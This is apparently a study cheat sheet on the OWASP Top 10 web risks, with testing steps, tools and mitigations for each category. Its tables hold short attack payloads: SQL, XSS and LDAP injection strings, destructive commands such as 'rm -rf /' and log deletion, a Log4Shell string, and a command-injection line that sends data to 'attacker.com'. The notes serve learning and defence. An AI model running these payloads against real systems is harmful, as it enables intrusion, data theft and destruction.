# OWASP Top 10 : 2021 Web Application

| Vuln                   | Process                     | Tools                        | Mitigation                         |
| ---------------------- | --------------------------- | ---------------------------- | ---------------------------------- |
| SQL Injection          | Inject payloads in inputs   | sqlmap, BurpSuite            | Prepared statements                |
| Broken Access Control  | Test IDOR, missing checks   | BurpSuite, manual review     | RBAC, deny by default              |
| Cryptographic Failures | Review encryption           | SSL Labs, code review        | Use TLS 1.2+, strong algorithms    |
| SSRF                   | Input URL → access metadata | BurpSuite, curl              | Whitelist URLs, block internal IPs |
| Outdated Components    | Inventory, CVE scan         | Snyk, OWASP Dependency-Check | Patch regularly                    |
| Logging Failures       | Review logs & alerts        | SIEM (Splunk, ELK)           | Centralize logs, alert rules       |



## A1 - Broken Access Control
- **Core Concept** Application fails to properly enforce what authenticated users can do, allowing unauthorized access to data or functions, Failure to enforce proper restrictions on authenticated users actions.
- Process:
- Attackers change URLs, modify HTTP methods, tamper parameters or tokens to access admin-only or other users' resources.
    - Attackers manipulates parameters/URLs to access unauthorized resources.
    - Exploits missing role checks to perform privileged actions.

| Type | Description |
|----------------------------------|---------------------------------------------------------------------------------|
| IDOR | Accessing others' resources via ID manipulation (e.g., /user?id=123 → 124) |
| Missing Function-Level Control | Accessing admin pages without authorization (e.g., /admin without admin role) |
| CSRF | Forcing users to execute unwanted actions via authenticated sessions |
| Privilege Escalation | User → Admin via flawed permission checks |
| Misconfigured Access Controls | Allowing open access by Mistake |
#### Finding - Broken Access Control
- Change IDs URLs/parameters.
- Access privileged endpoints without proper roles.
- Test with different user accounts.
    - **How to find**: Manual testing with tools (Burp Suite), reviewing authorization checks, fuzzing parameters.
#### Mitigations -  Broken Access Control
- Implement RBAC with server-side enforcement. 
    - Instead of directly granting permissions to individual users, you group users into roles (e.g., administrator, editor, guest).
- Use UUIDs(Universally Unique Identifiers) instead of sequential IDs. 
    - 128-bit numbers that are designed to be globally unique. They are randomly generated or based on timestamps and other unique identifiers, making them unpredictable and difficult for attackers to guess or enumerate.
- Add CSRF token and ```SameSite=Strict``` cookies.
    - cookie attribute instructs the browser to only send the cookie with requests that originate from the same site.


## A2 - Cryptographic Failures
- **Core Concept** Unsanitized user input is interpreted as code/command by backend systems, Exposure of Sensitive data due to weak encryption/handling.
- Process: 
- Identify sensitive data (PII, credentials); check how it’s stored, transmitted, and whether strong encryption is applied.
    - Intercept unencrypted data (e.g., HTTP -> passwords).
    - Decrypt weakly protected data (e.g., AES-128 without proper IV).

| Type | Description |
|----------------------------|--------------------------------------------------------------|
| Weak Algorithms | Using MD5/SHA-1 for password hashing |
| Poor Key Management | Hardcoded keys in source code |
| Insecure Hashing | Unsalted password hashes |
| Lack of Encryption | Storing credit cards in plaintext |
#### Finding - Cryptographic Failures
- Check for ```HTTP://``` in network traffic.
- Scan code/configs for hardcoded secrets.
   - **How to find**: Code review, scanning with tools (SSL Labs, testssl.sh), inspecting traffic with proxies.
#### Mitigations -  Cryptographic Failures
- Use TLS 1.3+ and AES-256-GCM.
    - TLS is a cryptographic protocol that provides secure communication over a computer network. TLS 1.3 is the latest version.
    - AES (Advanced Encryption Standard) is a symmetric encryption algorithm widely considered secure. AES-256-GCM is a secure mode of operation for AES that provides both encryption and authentication, ensuring data confidentiality and integrity.
- Hash passwords with bcrypt/PBKDF2.
    - bcrypt and PBKDF2 (Password-Based Key Derivation Function 2) are widely recommended password hashing algorithms that are resistant to brute-force attacks and rainbow table attacks. 
    - They use techniques like key stretching (repeating the hashing process multiple times) to make it computationally expensive to crack passwords.
- Rotate keys via cloud KMS.
    - Cloud Key Management System (KMS): A cloud KMS service (like Google Cloud KMS, AWS KMS, or Azure Key Vault) provides a centralized and secure way to manage cryptographic keys.


## A3 - Injection
- **Core Concept** Malicious data execution in interpreters (SQL, OS, etc.)
- Process:
- Identify input fields; inject payloads to manipulate SQL queries, OS commands, LDAP, etc.
    - Inject payloads input fields, Search boxs/APIs.
    - Trigger unintended execution (e.g., database deletion).

| Type | Payload Example | Target | Description | 
|------------------------|-----------------------------------------|---------------------|--------|
| SQL Injection | ' OR 1=1-- | Databases | Manipulating SQL queries to trick the database into retrieving confidential data |
| XSS | ```<script>alert(1)</script>``` | User browsers | Injecting malicious scripts into web pages to be executed by other users' browsers. This can allow attackers to steal sensitive data, hijack sessions, or perform actions on the user's behalf |
| OS Command | ; rm -rf / | Servers | Executing arbitrary operating system (OS) commands on a server through a vulnerable application. Attackers exploit applications that pass unsafe user-supplied data to a system shell |
| LDAP Injection | ```*)(uid=*))(\|(uid=*``` | Directories | Manipulating Lightweight Directory Access Protocol (LDAP) queries to exploit vulnerabilities in directory services. This can allow attackers to bypass authentication, modify data, or execute arbitrary commands within the LDAP server |
### SQL Injection
| Subtype               | Definition                                                                 | Detection Method                                                                 | Mitigation                                                                 |
|-----------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------|
| **Classic SQLi**      | Direct injection into SQL queries through user input.                      | Submit `' OR 1=1 --` in login forms; observe unexpected results.                | Use **parameterized queries** (Prepared Statements).                       |
| **Blind SQLi**        | No direct errors; infer results via boolean or time delays.                | Test with `' AND 1=1 --` (true) vs. `' AND 1=2 --` (false). Time-based: `SLEEP(5)`. | Implement **input validation** and **Web Application Firewalls (WAFs)**.   |
| **Union-Based SQLi**  | Uses `UNION` to combine queries and extract data.                          | Inject `' UNION SELECT username, password FROM users --`.                       | Disable error messages; use **ORM frameworks**.                            |
| **Error-Based SQLi**  | Forces DB errors to leak schema/data.                                      | Trigger errors with `' AND 1=CONVERT(int,@@version) --`.                        | Configure DB to suppress detailed errors.                                  |
| **Out-of-Band SQLi**  | Exfiltrates data via DNS/HTTP requests.                                    | Use tools like `Burp Collaborator` with `LOAD_FILE()` or `xp_dirtree`.          | Block outbound DB connections; sanitize inputs.                            |

### Cross-Site Scripting (XSS)
| Subtype               | Definition                                                                 | Detection Method                                                                 | Mitigation                                                                 |
|-----------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------|
| **Stored XSS**        | Malicious script stored on server (e.g., in comments).                     | Submit `<script>alert(1)</script>` in input fields; check persistence.          | Use **output encoding** (HTML Entity Encoding).                            |
| **Reflected XSS**     | Script reflected in immediate response (e.g., search results).             | Test URL params: `?q=<script>alert(1)</script>`.                                | Implement **Content Security Policy (CSP)**.                               |
| **DOM XSS**           | Client-side JS manipulates DOM unsafely.                                   | Analyze `document.write()` or `eval()` sinks in JS.                             | Avoid unsafe DOM APIs; use `textContent` over `innerHTML`.                 |
| **Mutated XSS**       | Bypasses filters via obfuscation (e.g., `<img src=x onerror=alert(1)>`).   | Fuzz with polyglots like `jaVasCript:/*--></title></style></textarea></script>`.| Use **XSS filters** (e.g., DOMPurify).                                     |

### OS Command Injection
| Subtype               | Definition                                                                 | Detection Method                                                                 | Mitigation                                                                 |
|-----------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------|
| **Classic Command Inj.** | Direct execution of OS commands via input (e.g., `; ls /etc`).            | Inject `; whoami` or `\|\| id` in input fields.                                 | Use **allowlist input validation**; avoid `system()` calls.                |
| **Blind Command Inj.**  | No visible output; infer results via delays or out-of-band techniques.     | Test with `ping -c 5 127.0.0.1` (time delay) or `curl attacker.com?data=$(ls)`. | Implement **sandboxed execution** (e.g., containers).                      |
| **Argument Injection**  | Manipulates command arguments (e.g., `tar --file=$(rm -rf /)`).            | Fuzz with `--version` or `$(sleep 5)`.                                          | Use **parameterized APIs** (e.g., `subprocess.run([cmd, arg1, arg2])`).    |


### LDAP Injection
| Subtype               | Definition                                                                 | Detection Method                                                                 | Mitigation                                                                 |
|-----------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------------|----------------------------------------------------------------------------|
| **Filter Injection**  | Modifies LDAP search filters (e.g., `(uid=*))(\|\|(cn=*))//`).             | Inject `*)(uid=*))(\|\|(1=0` to bypass auth.                                    | Use **LDAP parameterization** (e.g., `escapeDN()`).                        |
| **Attribute Injection** | Injects malicious LDAP attributes (e.g., `admin=true`).                   | Test with `*)(objectClass=*))%00` to truncate filters.                          | Apply **input sanitization** for special chars (`*, (, ), \`, etc.).       |
| **Booleanization**    | Uses LDAP boolean logic to leak data (e.g., `\|\|(mail=*@domain.com)`).    | Probe with `(cn=admin*)(sn=*))` to enumerate users.                             | Limit query results; enforce **access controls**.                          |
#### Finding - Injection
- Fuzz inputs with Burp Suite/SQLMap.
- Test error messages for backend tech leaks.
   - **How to find**: Use tools (sqlmap,Burp Suite), manual payloads, look for error messages.
#### Mitigations -  Injection
- Parameterized queries (Prepared Statement).
    - Parameterized queries, also known as prepared statements, separate SQL code from user-supplied input. Instead of directly embedding user input into the query string, you use placeholders for the values. 
-  Input validation with allowlists.
    - Input validation is the process of checking user-supplied data to ensure it conforms to expected formats, types, and values. Using allowlists (or whitelists)
- Output encoding for XSS.
    - Output encoding transforms potentially harmful characters in user-supplied or untrusted data into a safe format before displaying it on a web page. This prevents the browser from interpreting the data as executable code (like JavaScript) and mitigates the risk of XSS attacks.

## A4 - Insecure Design
> Insecure Design is a critical category in the OWASP Top 10 that focuses on inherent flaws in the architecture and design of a web application, rather than just implementation errors. These flaws can create vulnerabilities that cannot be fully mitigated by simply fixing code. Addressing Insecure Design requires a proactive approach from the outset of the development process.
- **Core Concept** Architectural flaws enabling business logic bypass.
- Application is insecure by design – security was never included during architecture or requirements phase.
- Process: 
- Map system architecture; do threat modeling; identify missing controls (e.g., rate limiting).
    - Exploit flawed workflows (e.g., replaying payment requests).
    - Bypass multi-step processes (e.g., skipping OTP verification).

| Type | Description |
|-------------|-----------------------|
| Race Conditions | Exploiting parallel processing (e.g., double-spending) |
| Missing Rate Limits| Brute-forcing passwords/OTPs |
#### Finding - Insecure Design
- Audit workflows for "trust assumptions".
    - Trust Assumptions: Insecure Design often arises from implicit or incorrect trust assumptions about users, data, or external systems. For example, assuming that all user input is safe or that external services are always reliable can lead to vulnerabilities.
- Test with automated tools (Burp Intruder).
    - Auditing: Conduct a thorough audit of your application's workflows to identify any trust assumptions. Analyze how data flows through the system and identify points where the application implicitly trusts external input or services without sufficient validation or security controls.
   - **How to find**: Threat modeling workshops; design reviews; attack scenarios.
#### Mitigations - Insecure Design  
- Threat modeling during design (STRIDE)
- Idempotency (denoting an element of a set which is unchanged) tokens for transactions.
Rate limiting (e.g., 5 login attempts/hour).

## A5 - Security Misconfiguration
- **Core Concept** Wrong or default security settings, unnecessary features, or insecure cloud storage, Unsecured defaults exposing systems.
- Process:
- Scan servers and codebase; look for open ports, default creds, verbose errors.
    - Access admin interfaces at default paths (`/admin`)
    - Exploit verbose errors leaking stack traces.

| Type | Description |
|---------|------------------|
| Default Credentials | `admin/admin` for admin consoles |
| Unpatched Systems | Unupdated Apache/WordPress |
| Overly Permissive CORS | Allowing `*` origins |
   
#### Finding - Security Misconfiguration
- Scan with OWASP ZAP/Nessus.
- Check `/robots.txt`, `/.env`, `phpinfo.php`
   - **How to find**: Tools: Nmap, Nessus, ScoutSuite (for cloud), manual review.
#### Mitigations -  Security Misconfiguration
- Automate hardening (CIS Benchmarks).
    - CIS Benchmarks are secure configuration recommendations for hardening various technologies, including operating systems, databases, and network devices.
- Disable directory listing and debug mode.
    - Disabling directory listing prevents attackers from browsing directory structures and potentially accessing sensitive files. (Nginx autoindex off).
    - Disabling debug mode in production environments prevents sensitive information (e.g., stack traces, detailed error messages) from being displayed to users, which can reveal underlying system flaws or component versions.(app.config['DEBUG'] = False)
- Use minimal CORS policies.
    - Configure your web server or application framework to set the `Access-Control-Allow/Origin, Headers` header with the specific allowed origins.

## A6 - Vulnerable and Outdated Components
- **Core Concept** Using libraries/frameworks/plugins with known vulnerabilities in third-party services.
- Process:
- Inventory dependencies; check versions; scan for known CVEs.
    - Identify versions via `package.json` /HTTP headers.
    - Exploit CVEs (e.g., Log4Shell: `${jndi:ldap//attacker}`)

| Type | Example |
|---------|-----------|
| Library Vulnerabilities| lodash prototype pollution (CVE-2020-8203) |
| Server Vulnerabilities | Unpatched Jenkins/WordPress |
#### Finding - Vulnerable and Outdated Components
- Use OWASP Dependency-Check/Snyk.
- Monitor CVE Databases
   - **How to find**: SCA tools:Snyk, OWASP Dependency-Check.
#### Mitigations - Vulnerable and Outdated Components 
- Patch management automation.
    - Automating the patching process ensures that security updates and patches are applied to your systems and applications consistently and efficiently.
- Virtual patching via WAFs.
    - Virtual patching leverages a Web Application Firewall (WAF) or Intrusion Prevention System (IPS) to detect and block attacks(exploit known vulnerabilities,) targeting specific vulnerabilities.
- Maintain SBOM (Software Bill of Materials).
    - A Software Bill of Materials (SBOM) is a comprehensive list of all software components used in a product, including open-source and proprietary components, their versions, and licenses.

## A7 - Identification and Authentication Failures
- **Core Concept** Weak login, password, or session management leads to account compromise, account security controls.
- Process:
- Test login flow, session timeouts, token predictability.
    - Brute-force weak passwords (`password123`).
    - Hijack sessions via exposed cookies.
   
| Type | Description |
|--------|--------------|
| Credential Stuffing | Reusing breached passwords |
| Session Fixation | Forcing session IDs on users |
| Predictable reset tokens | Guessable tokens in session |
| Missing MFA | No 2FA for sensitive actions |
#### Finding - Identification and Authentication Failures
- Test password policies (min length, complexity).
- Check session expiration/timeouts.
   - **How to find**: Manual testing, automated scanners, review token generation logic.
#### Mitigations - Identification and Authentication Failures
- Enforce MFA (TOTP, WebAuthn).
    - TOTP (Time-Based One-Time Password): A mobile app generates a temporary, time-sensitive code that the user must enter during authentication.
    - WebAuthn: A web standard that allows users to authenticate using strong cryptographic credentials (e.g., security keys, biometrics) instead of passwords.
- USe secure cookies (`HttpOnly`, `Secure`).
    - The `HttpOnly` flag prevents client-side scripts (e.g., JavaScript) from accessing the cookie. This mitigates the risk of XSS attacks, where an attacker could inject malicious scripts to steal session cookies.
    -The `Secure` flag ensures that the cookie is only sent over secure HTTPS connections. This protects the cookie from being intercepted by attackers over unencrypted HTTP connections.
- Implement account lockouts.

## A8 - Software and Data Integrity Failures
- **Core Concept** Failing to verify integrity of code or data allows attackers to temper updates or artifacts.
- Process:
- Check CI/CD pipelines, look for unsigned updates.
    - Upload malicious files (e.g., `shell.jpg.php`).
    - Compromise CI/CD to inject backdoors.
   
| Type | Description |
|--------|--------|
| Insecure Deserialization| RCE via pickled objects (Python) or Java serialization |
| CI/CD Attacks | Malicious code merges via compromised pipelines |
| Unsigned updates | software updates that are not digitally signed. |
| Lack of integrity checks | Notchecking the `MD5` or `SHA-256` values not checking from autorised sources. |
#### Finding - Software and Data Integrity Failures
- Test file uploads for double extensions.
    - Attackers may attempt to bypass file upload restrictions by using double extensions, such as `image.jpg.php`. If the application only validates the last extension, it might misinterpret the file as an image while allowing the embedded PHP code to be executed.
- Audit CI/CD scripts for signature checks.
    - Insecure Continuous Integration/Continuous Deployment (CI/CD) pipelines can be exploited by attackers to inject malicious code or artifacts into the build and deployment processes.
   - **How to find**: Code review, testing update flows. analyze serialization.
#### Mitigations - Software and Data Integrity Failures
- Validate digital signatures (GPG, Sigstore).
    - Digital signatures provide cryptographic assurance of the authenticity and integrity of software and data.
    - GPG (GNU Privacy Guard) is a widely used tool for generating and verifying digital signatures.
- Use schema validation for serialized data.
    - Schema validation ensures that serialized data conforms to a predefined structure or format, preventing attackers from injecting unexpected or malicious data.
- Scan artifacts in CI/CD.
    - Integrate security scanning tools (e.g., SCA tools, static analysis tools) into your CI/CD pipeline to automatically scan build artifacts for vulnerabilities.

## A9 - Security Logging and Monitoring Failures
- **Core Concept** Application doesn't detect or record security-relevant events, allowing undetected attacks.
- Process: 
- Review logging, test alerts, simulate attacks.
    - Delete logs(Attacker might delete who got the access to the logs) to cover tracks (`rm /var/log/auth.log`).
    - Exfiltrate data slowly to avoid alerts.
   
| Type | Description |
|------|------|
| Missing Audits | No logs for logins/data access |
| Centralization Failures| Logs not aggregated in SIEM |
| Insecure log Storage | No security for logs |
#### Finding - Security Logging and Monitoring Failures
- Verify if failed logins appear in monitoring.
- Test log deletion resistance.
    - Attempt to tamper with or delete logs, both locally on application servers and within your centralized logging system. Ensure that logs are either immutable or that deletion attempts are themselves logged and alerted upon.
   - **How to find**: Log review, SIEM gap analysis.
#### Mitigations - Security Logging and Monitoring Failures
- Centralize logs to SIEM (Splunk, ELK).
    - Instead of having logs scattered across individual application servers, you aggregate them into a centralized system like a SIEM (e.g., Splunk, Elastic Stack - ELK).
- Set alerts for 10+ failed logins/min.
    - Configure the SIEM or monitoring system to trigger an alert when a suspicious pattern of events is detected, such as multiple failed login attempts within a short timeframe.
- Use immutable logs (AWS CloudTrail).
    - Immutable logs prevent modification or deletion, ensuring the integrity of the audit trail. Services like AWS CloudTrail automatically record API activity within your AWS account and deliver those logs to a secure, tamper-proof location (like an S3 bucket with versioning and MFA delete enabled).

## A10 - Server-Side Request Forgery (SSRF)
- **Core Concept** App fetches remote resources based on user input without validation, Enabling requests to internal services, Forcing servers to fetch internal resources.
- Process:Find user-controlled URLs, test internal IPs (e.g., Cloud 169.254.169.254, Local 127.0.0.1)
    - Inject internal URLs into APIs (e.g., `?url=http://169.254.169.254`).
    - Fetch cloud metadata/AWS keys.

| Type | Description |
|-------|----------------|
| Basic SSRF | Read internal files/ports |
| Blind SSRF | Trigger out-of-band requests (DNS/HTTP) |
#### Finding - Server-Side Request Forgery (SSRF)
- Fuzz URL parameters with internal IPs.
    - Test the application's URL parameters by providing internal IP addresses (e.g., 127.0.0.1, 192.168.1.1) as values. Observe if the server attempts to access these internal resources.
- Monitor DNS callbacks (Burp Collaborator).
    - Utilize tools like Burp Collaborator to monitor if your application is making unexpected DNS requests to the Collaborator server when you provide certain inputs in URL parameters. This can indicate that the server is attempting to resolve and access the provided domains.
   - **How to find**: Manual testing (Burp Suite), fuzz URLs.
#### Mitigations - Server-Side Request Forgery (SSRF)
- Allowlist public domains.
    - Instead of allowing the application to make requests to any arbitrary domain, you maintain a predefined list of trusted public domains that the application is allowed to access. Any requests to domains outside this allowlist are blocked.
- Block internal IPs at WAF.
    - Configure your Web Application Firewall (WAF) to inspect outgoing requests from your application and block any requests that attempt to access internal IP addresses (e.g., 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 127.0.0.1).
- Sanitize inputs with regex.
    - Use regular expressions (regex) to sanitize and validate user input, ensuring that it conforms to expected formats and does not contain malicious characters or patterns.









# OWASP Top 10 - APIs

## A - 
- **Core Concept** 
- Process:
    - 
   
#### Finding - 
   - **How to find**: 
#### Mitigations - 

# OWASP Top 10 - Mobile Application

## A - 
- **Core Concept** 
- Process:
    - 

#### Finding - 
   - **How to find**: 
#### Mitigations - 
